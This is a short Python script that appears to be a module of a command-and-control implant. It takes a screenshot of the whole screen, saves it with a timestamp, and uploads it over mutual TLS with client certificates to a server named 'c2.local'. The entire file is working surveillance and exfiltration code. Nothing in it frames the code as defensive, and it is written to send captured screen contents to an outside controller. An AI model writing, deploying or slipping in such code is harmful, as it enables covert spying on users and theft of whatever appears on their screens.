import requests
from PIL import ImageGrab
from datetime import datetime
from pathlib import Path
SERVER_URL = "https://c2.local"
BASE_DIR = Path.cwd()
UPLOAD_ENDPOINT = "/upload"
keys_dir = BASE_DIR / "keys"

CLIENT_CRT = next(keys_dir.glob("[!c][!a]*.crt"))
CLIENT_KEY = next(keys_dir.glob("*.key"))
CA_CERT = keys_dir / "ca.crt"

now = datetime.now()
# Format: YYYY-MM-DD_HH-MM-SS
filename = now.strftime("%Y-%m-%d_%H-%M-%S") + ".png"


def run():
    # Take screenshot
    screenshot = ImageGrab.grab()
    screenshot.save(filename)
    screenshot.close()

    # Upload screenshot
    try:
        with open(filename, "rb") as file:
            files = {"file": file}
            response = requests.post(SERVER_URL + UPLOAD_ENDPOINT, files=files,cert=(CLIENT_CRT,CLIENT_KEY), verify=CA_CERT)
            print(response.status_code, response.text)

    except Exception as e:
        print(f"[!] Upload error: {e}")